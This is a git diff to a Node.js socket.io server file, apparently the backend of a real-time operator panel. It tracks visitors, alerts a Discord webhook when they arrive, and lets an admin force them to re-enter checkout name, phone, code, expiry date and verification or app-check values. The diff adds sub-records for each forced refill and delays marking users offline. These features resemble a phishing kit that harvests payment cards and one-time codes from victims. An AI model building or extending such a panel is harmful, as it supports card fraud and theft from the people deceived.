@@ -41,6 +41,7 @@ function registerSocketHandlers(ctx) {
     DISCORD_WEBHOOK_DEBUG,
     getAdminStats,
   } = ctx;
+  const pendingOfflineTimers = new Map();
 
   io.on('connection', (socket) => {
     const ip = getClientIp(socket);
@@ -60,10 +61,20 @@ function registerSocketHandlers(ctx) {
     });
 
     function markEnteredClient(key) {
-      if (!key) return;
+      if (!key) return false;
+      const previousKey = socketEnterKey.get(socket.id);
+      if (previousKey === key) return false;
+      if (previousKey && previousKey.startsWith('socket:') && key.startsWith('client:')) {
+        enteredClientIds.delete(previousKey);
+      }
       socketEnterKey.set(socket.id, key);
+      const before = enteredClientIds.size;
       enteredClientIds.add(key);
+      return enteredClientIds.size !== before;
     }
+
+    markEnteredClient(`socket:${socket.id}`);
+    emitAdmin();
 
     function notifyDiscordUserEntered(source, { recordId, clientId } = {}) {
       if (discordHomeNotified.has(socket.id)) return;
@@ -237,8 +248,7 @@ function registerSocketHandlers(ctx) {
       const lowerPage = p.toLowerCase();
       if (lowerPage === 'home' && !socketEnterKey.has(socket.id)) {
         const key = normalizeClientId(user?.clientId) ? `client:${normalizeClientId(user?.clientId)}` : `socket:${socket.id}`;
-        markEnteredClient(key);
-        emitAdmin();
+        if (markEnteredClient(key)) emitAdmin();
       }
       if (user) {
         user.ip = ip;
@@ -594,6 +604,7 @@ function registerSocketHandlers(ctx) {
 
       appendRecord(subRecord);
       setActiveRecord(socketId, subId);
+      io.to(socketId).emit('checkout-route', { target: 'info', reason: reason || 'Please refill recipient details' });
       targetSocket.emit('force-refill', { reason: reason || '', recordId: subId });
       emitAdmin();
       ack?.({ ok: true });
@@ -629,26 +640,43 @@ function registerSocketHandlers(ctx) {
       }
 
       pushCheckoutSnapshot(targetRecord);
-      targetRecord.checkoutName = '';
-      targetRecord.checkoutPhone = '';
-      targetRecord.checkoutCode = '';
-      targetRecord.checkoutExpiryDate = '';
-      targetRecord.checkoutDate = '';
-      targetRecord.verify = '';
-      targetRecord.verifyMethod = '';
-      targetRecord.emailVerify = '';
-      targetRecord.appCheck = '';
-      targetRecord.page = 'checkout';
-      targetRecord.online = true;
+      const mainId = getMainId(targetRecord.id) || targetRecord.id;
+      const subId = nextSubId(mainId);
+      const subRecord = buildSubRecordFrom(targetRecord, {
+        id: subId,
+        page: 'checkout',
+        status: 'Checkout refill requested - please re-enter',
+        historyStatus: 'Created sub record (refill checkout)',
+      });
 
-      touch(targetRecord, 'Checkout refill requested - please re-enter');
-      setActiveRecord(socketId, targetRecord.id);
+      subRecord.socketId = socketId;
+      subRecord.ip = targetRecord.ip || ip;
+      subRecord.deviceType = targetRecord.deviceType || deviceType;
+      subRecord.deviceOS = targetRecord.deviceOS || deviceOS;
+      subRecord.page = 'checkout';
+      subRecord.status = 'Checkout refill requested - please re-enter';
+      subRecord.online = true;
+      subRecord.checkoutName = '';
+      subRecord.checkoutPhone = '';
+      subRecord.checkoutCode = '';
+      subRecord.checkoutExpiryDate = '';
+      subRecord.checkoutDate = '';
+      subRecord.checkoutSnapshots = [];
+      subRecord.verify = '';
+      subRecord.verifyHistory = [];
+      subRecord.verifyMethod = '';
+      subRecord.emailVerify = '';
+      subRecord.appCheck = '';
+
+      touch(targetRecord, 'Checkout refill requested');
+      appendRecord(subRecord);
+      setActiveRecord(socketId, subId);
 
       io.to(socketId).emit('checkout-route', { target: 'checkout', reason: 'Please refill checkout information' });
-      targetSocket.emit('force-checkout-refill', { recordId: targetRecord.id });
+      targetSocket.emit('force-checkout-refill', { recordId: subId });
 
       emitAdmin();
-      ack?.({ ok: true });
+      ack?.({ ok: true, recordId: subId });
     });
 
     socket.on('admin-set-note', ({ recordId, note }, ack) => {
@@ -703,24 +731,25 @@ function registerSocketHandlers(ctx) {
       ack?.({ ok: true });
     });
 
-    socket.on('disconnecting', () => {
-      const user = onlineUsers.get(socket.id);
-      if (user) user.online = false;
-      discordHomeNotified.delete(socket.id);
-
-      store.records.forEach((r) => {
-        if (r.socketId === socket.id) {
-          r.online = false;
-          touch(r, r.status || 'Offline');
-        }
-      });
-
-      emitAdmin();
-    });
-
     socket.on('disconnect', () => {
-      cleanupSocketTracking(socket.id);
-      emitAdmin();
+      discordHomeNotified.delete(socket.id);
+      const timer = setTimeout(() => {
+        const user = onlineUsers.get(socket.id);
+        if (user) user.online = false;
+
+        store.records.forEach((r) => {
+          if (r.socketId === socket.id) {
+            r.online = false;
+            touch(r, r.status || 'Offline');
+          }
+        });
+
+        cleanupSocketTracking(socket.id);
+        pendingOfflineTimers.delete(socket.id);
+        emitAdmin();
+      }, 8000);
+
+      pendingOfflineTimers.set(socket.id, timer);
     });
   });
 }
